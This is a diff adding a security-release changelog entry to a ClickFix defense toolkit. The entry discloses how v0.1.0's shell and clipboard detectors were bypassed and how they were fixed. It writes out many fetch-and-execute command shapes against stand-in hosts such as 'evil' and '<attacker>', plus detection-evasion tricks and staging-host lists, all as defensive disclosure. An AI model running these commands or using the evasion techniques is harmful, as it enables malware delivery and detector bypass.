@@ -5,6 +5,160 @@ All notable changes to the ClickFix Defense Kit are documented here.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [0.1.1] — 2026-07-29
+
+**Security release. If you are running v0.1.0, upgrade.**
+
+v0.1.0's detection grammar was adversarially tested for the first time and it
+did not hold. Nine of thirteen realistic ClickFix payload shapes passed
+ShellGuard **silently** — no prompt, no banner, nothing. ExposureScan's headline
+privacy invariant was false for the highest-value secret class it ranks P0. And
+ShellGuard's confirmation prompt could not actually be completed.
+
+Every bypass is written up in [SECURITY.md](./SECURITY.md), and every one is now
+a row in [`tests/corpus.tsv`](./tests/corpus.tsv) that fails the build if it ever
+regresses. This project's whole pitch is refusing claims it cannot back, so it
+publishes its own misses.
+
+### Fixed — ShellGuard (detection)
+
+- **The grammar is no longer regexes over a raw string.** Detection moved to a
+  tokenizer in the new shared `lib/clickfix-grammar.zsh`, which respects
+  quoting, splits into statements and pipeline stages, and normalizes each
+  stage's command word before classifying it. Evading it now requires changing
+  what the command *does*, not how it is spelled. Bypasses closed:
+  - `curl "https://evil/x?a=1&b=2" | sh` — an ordinary `&` in a query string
+    broke the `[^|;&]*` run, so **any URL with a query string was invisible**.
+  - `curl https://evil/x | bash;` — one trailing character broke the
+    `([[:space:]]|$)` anchor.
+  - `curl https://evil/x | /bin/sh`, `| \sh`, `| 'sh'`, `| command sh`,
+    `| env sh`, `| sudo -u nobody sh` — a path, a quote, a backslash or a
+    prefix command defeated the bare-literal interpreter match.
+  - `bash -c "$(curl -fsSL https://evil/x)"` — no pipe-to-interpreter shape at
+    all, so nothing matched. This is the Homebrew-installer shape.
+  - `$(curl https://evil/x)` — a bare command substitution with no `eval`.
+  - `curl … | tee /tmp/p | sh`, `curl … | gunzip | bash` — an interposed stage.
+  - `curl -o /tmp/p https://evil/x; sh /tmp/p` — download and execute split
+    across two statements. Now detected at the `warn` tier.
+  - `osascript -e 'do shell script "curl … | zsh"'` — the shape used by the
+    `applescript://` Script Editor lure, which never touches a shell prompt.
+  - `xxd -r`, `openssl enc -d`, `tr` and other non-base64 decoders.
+- **`raw.githubusercontent.com` and `raw.github.com` removed from the default
+  allowlist.** Any GitHub account can publish an arbitrary script to those
+  hosts, so v0.1.0 was telling an attacker exactly where to stage a payload it
+  would then wave through in silence. Trust is now scheme+host+**path prefix**
+  (`raw.githubusercontent.com/ohmyzsh/` and friends), and the wildcard-subdomain
+  trust rule is gone.
+- **The allowlist can no longer waive the always-hostile rules.** v0.1.0 applied
+  it uniformly after all patterns, which silently waived its own osascript rule
+  — the one its source comment called "always hostile".
+- Added a never-allowlistable high-risk staging host set (gist, Discord CDN,
+  pastebin, IPFS, ngrok, transfer.sh …) that escalates the warning instead.
+- Added detection for `xattr -c` / `-d com.apple.quarantine` (manually
+  disarming Gatekeeper) and for `hdiutil attach` of a remote or `/tmp` disk
+  image (the delivery step in current macOS stealer campaigns).
+- Added detection for zero-width, bidi and Cyrillic/Greek look-alike characters
+  in command position.
+
+### Fixed — ShellGuard (the confirmation gate could not be completed)
+
+- **`read -r < /dev/tty` inside a ZLE widget never returned.** While a widget
+  runs, the line editor holds the terminal in raw mode with echo off: the user
+  saw nothing as they typed, and because Enter sends CR (not LF) in raw mode,
+  `read` waited forever. The typed-phrase gate — the entire point of the block
+  tier — was not completable. It now uses zsh's `read-from-minibuffer`, with an
+  `stty sane` save/restore fallback. Covered by a new pty-driven integration
+  test that types into a real interactive zsh and checks a marker file to prove
+  an aborted payload genuinely does not execute.
+- The command is no longer printed raw into the warning banner. It is stripped
+  of control characters and capped in height, so a payload cannot emit ANSI to
+  scroll the warning off screen or paint a fake confirmation line into it.
+
+### Fixed — false positives (an uninstalled guard catches nothing)
+
+- Unquoted `#` comments are stripped before analysis, so
+  `ls # dont run curl https://x | sh` no longer prompts — and a decoy trailing
+  comment no longer suppresses ClipSentinel.
+- `/dev/tcp` only fires when it appears **outside** a quoted string, or inside
+  an interpreter's `-c` program. `git commit -m "note about /dev/tcp/h/9000"`
+  no longer prompts.
+- An inline `python -c` program now requires **both** a network primitive and an
+  exec primitive. v0.1.0 fired on either alone, so
+  `python3 -c "import os; os.system(1)"` was flagged with no network involved.
+- `curl … | python3 -m json.tool` is downgraded to `warn` rather than blocked.
+- **New `warn` tier**: banner plus a single Enter, for heuristics with real
+  false-positive rates. The typed phrase is reserved for unambiguous attack
+  shapes, so it does not become muscle memory.
+
+### Fixed — ClipSentinel
+
+- **A single token silenced the entire tool.** `_is_allowlisted` was a bare
+  substring test against the whole clipboard buffer and its list contained
+  `install.sh`, so `curl https://<attacker>/get4/install.sh | bash` — the shape
+  in published AMOS IOCs — raised nothing. `bun.sh` likewise substring-matched
+  `evil-bun.shop`, and appending `# deno.land` suppressed anything at all. A
+  ClickFix page controls the exact clipboard bytes, so this was a guaranteed,
+  attacker-chosen, total suppression.
+- ClipSentinel and ShellGuard now share one grammar file. The v0.1.0 README
+  claimed they were "kept in lockstep"; they disagreed on 6 of 13 payloads. CI
+  now fails if either tool grows its own host list or detection regex again.
+- The event log no longer records a preview of the copied text (which included
+  the attacker URL) while the README promised contents were "never stored". It
+  records the verdict, the reason, and a truncated hash — enough to correlate
+  two events, never enough to recover the payload.
+
+### Fixed — ExposureScan
+
+- **The "architecturally incapable of emitting a secret value" claim was false.**
+  A 12-word BIP-39 seed phrase passed `redact()` byte-identical (no unbroken
+  20-character run, no `=`), as did `postgres://admin:hunter2@host/db` and
+  `PIN 4821 / password hunter2`. `KEY = correct horse battery staple` emitted
+  three of the four words *and* a literal `<redacted>` that made the line look
+  sanitized.
+- **Apple Notes titles were emitted verbatim, and Apple derives the title from
+  the note's first line** — so for the exact user this surface exists for
+  (someone who pasted a seed phrase into Notes) the secret *was* the title.
+  Findings now carry `Note #id (title N chars, modified <date>)`.
+- **PII filenames were emitted verbatim** into stdout, the markdown report and
+  the JSON sidecar — a card number in a filename was reproduced and annotated
+  `credit-card: 1`. Now withheld behind a hash.
+- **Seed-phrase *detection* only matched the label** ("seed phrase",
+  "mnemonic"). A note containing nothing but the twelve words — the actual
+  catastrophic case — was never flagged at all.
+- Ships the 2048-word BIP-39 list; redaction triggers at ≥6 consecutive
+  wordlist tokens, detection at ≥11.
+- Control characters, ANSI escapes and markdown metacharacters are neutralised,
+  so a crafted filename or note title can no longer inject a forged finding
+  into the report.
+- `shutil.copy2` → `copyfile` + explicit `chmod 0600`: `copystat` was widening
+  the temp copy of browser Login Data back to the source's 0644.
+- Temp database copies are now removed on exception, SIGINT, SIGTERM and
+  SIGHUP instead of being orphaned in `TMPDIR`.
+- `--out`/`--json` are written 0600 and atomically; the README no longer
+  demonstrates writing a credential map to `/tmp`.
+- Dropped `immutable=1`, which made SQLite ignore the `-wal` file the code went
+  to the trouble of copying — silently under-counting the most recent logins and
+  cookies in a report whose entire output is a risk score.
+
+### Fixed — Canary
+
+- **`canary --list` crashed on any non-empty ledger.** It read the field into
+  `_kind` and printed `$kind`, and under `set -u` that aborted with
+  `kind: unbound variable`. The advertised audit command had never worked, so
+  nobody had ever successfully reviewed a plant — including the missing-decoy
+  check that is itself a breach signal.
+
+### Added
+
+- `lib/clickfix-grammar.zsh` — the shared, tokenizer-based detection grammar.
+- `tests/corpus.tsv` — 78 asserted payload/verdict rows, including every
+  v0.1.0 bypass and every known false positive.
+- `tests/run-corpus.zsh` — corpus runner plus the anti-drift assertion.
+- `tests/test-zle-integration.zsh` — drives a real interactive zsh over a pty.
+- `exposurescan/tests/test_invariant.py` — 35 new tests, including end-to-end
+  scan→render→sidecar assertions that no secret reaches any artifact.
+- CI now runs the corpus and the pty integration test on **macOS** runners.
+
 ## [Unreleased]
 
 ### Added
